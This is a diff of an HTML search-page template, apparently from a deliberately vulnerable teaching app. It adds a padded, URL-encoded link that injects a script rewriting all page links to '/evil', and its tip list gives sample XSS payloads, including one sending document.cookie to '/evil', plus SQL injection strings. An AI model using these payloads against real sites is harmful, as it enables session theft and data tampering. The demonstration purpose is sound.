@@ -6,14 +6,16 @@
         <input type="submit" value="GO!"/>
     </form>
 </div>
-<div class="search-tip">
-    <b> Tip: </b>
+<div class="tip">
+    <b> Tip: </b><br/>
+    Search for <a href="?search=Facebook++++++++++++++++++++++++++++++++++++++++++++++++++++++++%3Cscript%3E+%24%28function%28%29%7B%24%28%22a%22%29.attr%28%22href%22%2C+%22%2Fevil%22%29%3B%7D%29%3B+%3C%2Fscript%3E">Facebook</a>
     <ol>
         <li> Facebook </li>
         <li> &lt;script&gt; alert(&quot;XSS!&quot;) &lt;/script&gt; </li>
         <li> Facebook &lt;script&gt; $(function(){$(&quot;a&quot;).attr(&quot;href&quot;, &quot;/evil&quot;);}); &lt;/script&gt; </li>
         <li> &lt;script&gt; $.get(&quot;/evil?save=cookie&amp;cookie=&quot;+encodeURI(document.cookie)); &lt;/script&gt; </li>
-        <li>aaa ' OR link LIKE 'http%</li>
+        <li>'</li>
+        <li>aaa ' OR hide=1 OR  hide='</li>
     </ol>
 </div>
 <div>
